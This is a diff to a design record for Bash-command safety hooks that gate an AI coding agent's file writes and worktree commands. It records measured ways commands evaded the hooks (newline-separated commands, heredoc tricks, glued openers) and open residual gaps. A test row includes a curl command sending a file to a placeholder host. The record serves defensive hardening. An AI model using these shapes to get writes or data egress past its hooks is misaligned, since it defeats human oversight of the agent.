@@ -210,11 +210,18 @@ classification.
   the first line's. `writ-worktree-safety.sh` pre-splits newlines outside quotes and strips
   heredoc bodies for exactly this reason; the write gate does neither, and porting it needs
   the heredoc stripper too, or a document ABOUT a write becomes a refusal. Deferred to its
-  own cycle and disclosed in the header rather than bolted on here.
+  own cycle and disclosed in the header rather than bolted on here. CLOSED by the cycle R
+  amendment below, which found that porting the worktree hook's helpers VERBATIM would have
+  been a net loss: the stripper's own two defects are recorded there.
 
-**In the worktree hook the splitter runs AFTER heredoc-body stripping**, on purpose, so a
-body line is never re-split and can never contribute a segment. That ordering is what keeps
-`cat <<'EOF' ... git worktree add ... EOF` from becoming a refusal.
+**The splitter runs AFTER heredoc-body stripping**, on purpose, so a body line is never
+re-split and can never contribute a segment. That ordering is what keeps
+`cat <<'EOF' ... git worktree add ... EOF` from becoming a refusal. As of cycle R it holds
+in BOTH hooks, because the pre-split and the stripper are members of the shared mirror
+block rather than one hook's private helpers, so the ordering is a property of the block
+and not of a single call site. What the ordering does NOT buy: an opener GLUED to what
+follows it (`cat <<'EOF'>f`) is not recognized as an opener at all, because stripping runs
+on the RAW shlex tokens, ahead of the splitter that would have separated them.
 
 **What is NOT proven.** The classifier (`gates._is_credential_path`), the embedded
 extractor's rows and the real hook's `permissionDecision` were all measured. A write
@@ -429,8 +436,8 @@ uncorrected `/dev/null` is a `NONFILE` member and has never produced one.
 - A FUNCTION DEFINITION body: `f() { cp a src/x.py; }` resolves its verb to `f()`. Out of
   scope rather than missed, because the body writes only when the function is CALLED, and
   the call resolves to the verb `f`, which is the already-disclosed wrapper-script limit.
-- `foo>src/x.py` and the NEWLINE separator in the write gate, both unchanged and both still
-  disclosed in that hook's header.
+- `foo>src/x.py`, unchanged and still disclosed in that hook's header. The NEWLINE
+  separator was listed here too, and it is CLOSED by the cycle R amendment below.
 
 ### Measured versus inferred
 
@@ -837,3 +844,162 @@ earlier cycle in this family recorded; and a write LANDING ON DISK through the f
 Code path, which a `PreToolUse` hook test cannot show at all. INFERRED, not measured:
 `find . -exec git worktree remove x \;` evading the worktree gate, and `fd --exec` carrying
 the same mechanism under a spelling this fix does not cover.
+
+## Amendment (cycle R): a newline separator, and a defective reference implementation
+
+Sixth instance of the same seam, and the first one where the fix ALREADY EXISTED in the
+other hook and was itself wrong. `CONTROL` in `writ-bash-write-gate.sh` carried a `"\n"`
+member that matched NOTHING, because `shlex.split` treats a newline as ordinary whitespace
+and never emits it as a token, so a multi-line command was ONE segment whose verb was the
+first line's.
+
+### Measured before the fix
+
+Through the write gate's own embedded extractor with `WRIT_CWD=/proj`:
+
+```
+"ls\ncp seed.txt src/x.py"                       -> set()                    INVISIBLE
+"ls ; cp seed.txt src/x.py"                      -> local /proj/src/x.py      control
+"ls\necho y > src/x.py"                          -> local /proj/src/x.py      VISIBLE
+"ls\ncurl -d @src/a.txt https://example.invalid" -> set()                    INVISIBLE
+```
+
+A newline hid every VERB-DEPENDENT write and every egress row, and hid no REDIRECT. That
+asymmetry is the mechanism, not luck: the redirect loop never consults the verb, while the
+four `cmd0` write arms and the egress pass all do, so flattening the command into one
+segment blinded exactly the arms that ask "what is the verb here?".
+
+### The reference implementation was defective, and both defects were EXECUTED
+
+`writ-worktree-safety.sh` had carried a newline pre-split and a heredoc-body stripper since
+1.7.0, so this cycle reads like a port. It is not. Both halves were copied out verbatim and
+RUN. The pre-split is correct. The stripper is wrong twice over:
+
+```
+doc ABOUT a write, with a REAL same-line redirect
+  cat <<'EOF' > docs/notes.txt / old command: echo y > src/x.py / EOF
+    today (no pre-split)     src/x.py True   docs/notes.txt True    n=11
+    pre-split only           src/x.py True   docs/notes.txt True    n=13
+    pre-split + stripper     src/x.py False  docs/notes.txt False   n=1
+
+interpreter fed by heredoc, REAL write in the body
+  python3 - <<'EOF' / open('src/x.py',...) / EOF
+    today (no pre-split)     src/x.py True                          currently DETECTED
+    pre-split + stripper     src/x.py False                         coverage LOST
+```
+
+DEFECT 1, NO SAME-LINE BOUNDARY. The function consumed tokens from immediately after the
+opener token and scanned forward for the terminator, so everything legitimately following
+the opener ON ITS OWN LINE was swallowed with the body: 11 tokens in, 1 out, and
+`docs/notes.txt`, the command's real destination, lost along with the phantom. Bash starts
+a heredoc body at the next NEWLINE. That function had no notion of a newline at all.
+
+DEFECT 2, IT DELETED COVERAGE THE WRITE GATE ALREADY HAD. A stdin-fed interpreter sets
+`stdin_interpreter` and then scans the ENTIRE token list, which is how a `python3 - <<'EOF'`
+body is seen; the write gate's header claims that coverage in the inline-interpreter block.
+Stripping the body removes the only place that source text appears, so a verbatim port would
+have been a NET LOSS on a vector that worked.
+
+WHY THE WORKTREE HOOK COULD NOT SEE EITHER ONE, which is the part the next reader needs:
+that hook has no redirect vector at all and asks only whether a `git worktree add` is
+present, and its single heredoc test asserted only the verdict and said nothing about a
+target. So the same-line defect had zero coverage there and the destination half of it was
+structurally unobservable.
+
+### Decision: three parts, one shared copy
+
+1. THE PRE-SPLIT IS REUSED UNCHANGED. It is a pure quote-aware text transform: a newline
+   inside a quoted string stays data, and the escape branch keeps a backslash-continued
+   line one command. Rewriting a correct function to look new would have been churn.
+2. THE STRIPPER IS REPAIRED AT THE NEWLINE BOUNDARY. The body is the run from the FIRST
+   `SEP` after the opener through the terminator word, so `cat <<'EOF' > docs/notes.txt`
+   keeps its destination. The OPENER TOKEN is emitted too, and that is load-bearing rather
+   than tidy: `inline_form` reads any argument starting with `<` as the stdin form, so the
+   opener is the ONLY marker of the no-dash `python3 <<'DELIM'` spelling, and the 1.7.0 copy
+   dropped it. An opener with no following `SEP` strips nothing, because there is no body in
+   that token stream and consuming to the end would silence the rest of the command.
+3. THE STDIN SCAN KEEPS THE UNSTRIPPED STREAM. Segmentation and every per-segment pass read
+   the STRIPPED list; the `stdin_interpreter` whole-command scan reads the UNSTRIPPED one.
+   The reason is that pass's own design rather than convenience: it is deliberately a coarse
+   bag-of-literals question over the whole command, so the pre-strip stream is what matches
+   its stated contract. The extra pass is built INSIDE the `if stdin_interpreter:` branch, so
+   a command that is not a stdin-fed interpreter never pays it.
+
+Both helpers went INSIDE the mirrored block, so ONE repaired copy serves both hooks and the
+existing byte-identity and per-copy stream-equivalence tests guard drift. The alternative
+was to add them to the write gate alone and leave the worktree hook's copies untouched; it
+was rejected because the two copies would then differ in BEHAVIOR while claiming a shared
+mechanism, and because the same-line defect is a live hole in the worktree hook.
+
+Cycle Q put `nested_command_spans` OUTSIDE the block for the stated reason that sharing it
+would change the worktree hook's behavior on UNMEASURED evidence. That is not a
+contradiction with this cycle: here the worktree hook is the file the evidence is ABOUT. It
+already ran both helpers and one of them was executed wrong.
+
+### The zero-import contract retired a regex
+
+`writ/session/bash_tokens.py` imports NOTHING on purpose, so it loads under `python -S` and
+is safe to paste inline, and the mirror test EXECS the block in an empty namespace. The
+stripper's opener test was a `re.compile` pattern, which could not go in the block. It is
+now string operations, and the character classes are SPELLED OUT (`_HD_FIRST`, `_HD_REST`)
+rather than using `str.isalnum()`, because `isalnum()` is Unicode-aware and would have
+silently widened the population the retired `[A-Za-z_][A-Za-z0-9_]*` classes defined while
+reading as a faithful translation. One behavior deliberately changed in the rewrite: an
+EMPTY delimiter (`<<''`) is no longer accepted as an opener. The regex accepted it, then
+scanned for a token equal to the empty string, found none, and swallowed the rest of the
+command.
+
+### The worktree hook's own hole
+
+The one place the same-line repair changes a VERDICT in that hook:
+
+```
+cat <<'EOF' > notes.md ; git worktree add scratch/feature-x feature-x
+some notes
+EOF
+```
+
+With the 1.7.0 stripper the run from the opener through `EOF` was swallowed, so
+`git worktree add` never reached a segment and the command was ALLOWED SILENTLY. With the
+same-line boundary the invocation survives and the hook denies with
+`ENF-PROC-WORKTREE-001`. A test pins it, which turns "a known-defective copy is being
+repaired" from prose into an executable claim.
+
+### Residue that stays open
+
+Three shapes degrade, each fail-closed (an extra row or a lost DESTINATION, never a lost
+verdict on a command that runs), all three MEASURED through the extractor with
+`WRIT_CWD=/proj`:
+
+- A body line naming the terminator word MID-LINE ends the strip early, because this is a
+  token scan and bash's rule is a LINE rule. `cat <<'EOF' > docs/notes.txt` over
+  `this EOF is not a terminator > src/x.py` emits BOTH `local /proj/docs/notes.txt` and
+  `local /proj/src/x.py`: the remaining body tokens become arguments of the opener line's
+  command, so the phantom returns.
+- TWO heredoc openers on one command (`cat <<'A' <<'B'`) honor only the FIRST terminator, so
+  the second body is judged as commands: measured as `local /proj/docs/notes.txt` plus
+  `local /proj/src/x.py`. Collecting successive bodies is more code for a shape neither hook
+  has ever seen.
+- An opener GLUED to what follows it (`cat <<'EOF'>docs/notes.txt`) is not recognized as an
+  opener at all, because stripping runs on the RAW shlex tokens ahead of
+  `split_control_operators`. That ordering is deliberate: a body line must never be
+  re-split, or it can contribute a segment. MEASURED: the command emits
+  `local /proj/src/x.py` ALONE. The body line becomes its own segment and is judged (an
+  extra row, fail-closed), and the opener's own destination is NOT recovered, because
+  `REDIR` cannot match a token that starts with `<` and the splitter deliberately does not
+  split `>`. That is the SAME `foo>src/x.py` residue this ADR has disclosed since it was
+  written, reached through a heredoc opener rather than through a verb, and closing it needs
+  the tokenizer change this ADR RULED OUT.
+
+### Measured versus inferred
+
+MEASURED or EXECUTED: the four extractor rows before the fix and after it; both heredoc
+token-stream comparisons on a verbatim copy of the 1.7.0 helpers, including the token counts
+11, 13 and 1 and the two boolean columns; the post-repair count for the doc case, 4 tokens
+(`cat`, the opener, `>`, `docs/notes.txt`), which is what the same-line boundary buys over
+the reference implementation's 1; the three residue rows above; and the worktree hook's deny
+on a `git worktree add` sharing the heredoc opener's line.
+
+NOT MEASURED, stated plainly: a write LANDING ON DISK through the full Claude Code path,
+which a `PreToolUse` hook test cannot show at all, the same boundary every earlier cycle in
+this family recorded.
